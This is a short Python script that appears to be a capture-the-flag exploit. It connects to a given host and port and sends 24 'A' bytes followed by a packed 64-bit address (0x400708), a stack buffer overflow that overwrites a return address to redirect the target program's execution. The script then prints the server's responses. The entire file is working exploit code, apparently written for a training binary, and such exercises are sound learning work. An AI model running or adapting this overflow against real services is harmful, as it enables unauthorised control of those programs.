#!/usr/bin/env python3

import socket
import argparse
import struct

# Argument parsing
parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="The hostname or IP address")
parser.add_argument("port", type=int, help="Port")
args = parser.parse_args()

# Prepare the payload
payload = b"".join([b"A" * 24, struct.pack("<Q", 0x0000000000400708)])        #0x400708
print(payload)
payload += b"\n"

# Create a socket and connect
with socket.socket() as connection:
    connection.connect((args.host, args.port))
    
    # Receive and print the first line of the response
    print(connection.recv(4096).decode("utf-8"))
    
    # Send the payload
    connection.send(payload)
    
    # Receive and print the response
    print(connection.recv(4096).decode("utf-8"))
    print(connection.recv(4096).decode("utf-8"))
    print(connection.recv(4096).decode("utf-8"))
